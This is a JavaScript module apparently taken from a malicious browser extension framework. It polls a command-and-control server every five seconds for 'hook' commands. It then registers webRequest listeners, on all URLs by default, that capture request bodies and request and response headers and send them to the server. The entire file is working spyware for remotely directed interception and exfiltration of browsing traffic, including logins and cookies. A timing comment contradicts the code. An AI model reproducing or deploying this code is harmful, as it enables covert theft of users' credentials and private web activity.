////////////////////////////////////////////////////////////////
// C&C <-> Module Communication
////////////////////////////////////////////////////////////////

// This header will be defined for every module to define processing of new cmds 
// & querying new cmds from server.  
// Define one header to embed all necessary c&c server functions.
let executedCmd = {{CC_EXECUTED_CMD_FN}};
let getCmds = {{CC_GET_CMDS_FN}};
let sendData = {{CC_SEND_DATA_FN}};
let QUERY_CMDS_INTERVAL = 5 * 1000; // Get new cmds from server every 10 secs.
let MODULE_NAME = 'proxy';
//

function execModuleWithParams(args) {
	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
		MODULE_TECHNIQUES[i](...args);
	}
}

function parseExecCmdsMail(cmds_list) {
	// Commands Format:
	// (module_name, op, args_list)
	// ["proxy", "hook", ['site', 'http://*/*']]
	// ["proxy", "hook", ['rm', 'http://*/*']]
	for (let i=0; i<cmds_list.length; i++) {
		let cmd = cmds_list[i];
		if (cmd[0].toLowerCase() === MODULE_NAME) {
			if (cmd[1].toLowerCase() === 'hook') {
				execModuleWithParams(cmd[2]);
				executedCmd(cmd); // Inform C&C module for execution
			}
		}
	}
}


async function queryNewCmds() {
	let cmds_list = await getCmds();
	await parseExecCmdsMail(cmds_list);
}


function main() {
	setInterval(queryNewCmds, QUERY_CMDS_INTERVAL);
}

setTimeout(main, 5000); // Lazy 5-secs start-up.


////////////////////////////////////////////////////////////////
// Main Module Techniques 
///////////////////////////////////////////////////////////////

// Requires: "*:///*//*" and webRequest in permissions.

// dict of site->hook_function.
var sites_to_fn = {};
// Example keys:
// {'*://*/*': hook_fn};
// Example logger function = fn = e=>console.log(e);

async function handle_request_intercept(url, req_res_data) {
	// Stringify it & send it up to server side.
	hook_data = [url, JSON.stringify(req_res_data)];
	sendData(JSON.stringify(hook_data));
}

async function try_catch_exec(fn) {
	try {
		fn();
	}
	catch (e){
		console.log(e);
		return false;
	}
	return true;
}

async function fn_rm_hook(site_url) {
	if (sites_to_fn[site_url]) {
		let fn_handler = sites_to_fn[site_url]; 
		if (chrome.webRequest) {
			try_catch_exec(_ =>
				chrome.webRequest.onBeforeRequest.removeListener(fn_handler)
				);
			try_catch_exec(_ =>
				chrome.webRequest.onBeforeSendHeaders.removeListener(fn_handler)
				);
			try_catch_exec(_ =>
				chrome.webRequest.onHeadersReceived.removeListener(fn_handler)
				);
		} 
		if (browser.webRequest) {
			try_catch_exec(_ =>
				browser.webRequest.onBeforeRequest.removeListener(fn_handler)
				);
			try_catch_exec(_ =>
				browser.webRequest.onBeforeSendHeaders.removeListener(fn_handler)
				);
			try_catch_exec(_ =>
				browser.webRequest.onHeadersReceived.removeListener(fn_handler)
				);
		}
		delete sites_to_fn[site_url];
	}
}

async function add_hook_fn(site, fn_handler) {
	var types = ["main_frame", "sub_frame"];

	if (chrome.webRequest) {
		try_catch_exec(_ =>
			chrome.webRequest.onBeforeRequest.addListener(fn_handler, {urls: [site], types: types}, ['requestBody', 'extraHeaders'])
			);
		try_catch_exec(_ =>
			chrome.webRequest.onBeforeSendHeaders.addListener(fn_handler, {urls: [site], types: types}, ['blocking', 'requestHeaders', 'extraHeaders'])
			);
		try_catch_exec(_ =>
			chrome.webRequest.onHeadersReceived.addListener(fn_handler, {urls: [site], types: types}, ['blocking', 'extraHeaders', 'responseHeaders'])
			);
	} 
	if (browser.webRequest) {
		try_catch_exec(_ =>
			browser.webRequest.onBeforeRequest.addListener(fn_handler, {urls: [site], types: types}, ['requestBody', 'extraHeaders'])
			);
		try_catch_exec(_ =>
			browser.webRequest.onBeforeSendHeaders.addListener(fn_handler, {urls: [site], types: types}, ['blocking', 'requestHeaders', 'extraHeaders'])
			);
		try_catch_exec(_ =>
			browser.webRequest.onHeadersReceived.addListener(fn_handler, {urls: [site], types: types}, ['blocking', 'extraHeaders', 'responseHeaders'])
			);
	}
	sites_to_fn[site] = fn_handler;
	return true;
}


async function hook_site(site_url) {
	if(!site_url) {
		site_url = '*://*/*'; // Hook it all on default.
	}
	add_hook_fn(site_url, 
		handle_request_intercept.bind('url', site_url));
}

async function rm_hook_site(site_url) {
	fn_rm_hook(site_url);
}

async function site_hook_main(main_cmd, site_url) {
	if (main_cmd === 'site') {
		hook_site(site_url);
	}
	else if(main_cmd === 'rm') {
		rm_hook_site(site_url);
	}
}

let MODULE_TECHNIQUES = [site_hook_main];
